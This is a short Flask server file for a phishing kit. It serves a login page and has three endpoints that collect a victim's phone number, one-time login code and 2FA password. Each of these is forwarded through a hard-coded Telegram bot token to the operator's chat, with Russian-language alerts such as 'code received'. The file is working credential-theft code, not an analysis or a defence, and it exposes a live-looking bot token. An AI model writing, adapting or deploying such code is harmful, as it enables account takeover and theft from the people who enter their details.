from flask import Flask, request, jsonify, send_from_directory
import requests
import os
import re

app = Flask(__name__)

BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
OWNER_ID = 208405935

def send_telegram(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": OWNER_ID, "text": text[:4000]})
    except:
        pass

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.json.get('phone', '')
    send_telegram(f"📱 НОВЫЙ НОМЕР: {phone}")
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    phone = request.json.get('phone', '')
    code = request.json.get('code', '')
    send_telegram(f"🔓 ПОЛУЧЕН КОД\nТелефон: {phone}\nКод: {code}")
    return jsonify({"success": True})

@app.route('/api/verify_2fa', methods=['POST'])
def verify_2fa():
    phone = request.json.get('phone', '')
    password = request.json.get('password', '')
    send_telegram(f"🔐 ПОЛУЧЕН ПАРОЛЬ 2FA\nТелефон: {phone}\nПароль: {password}")
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
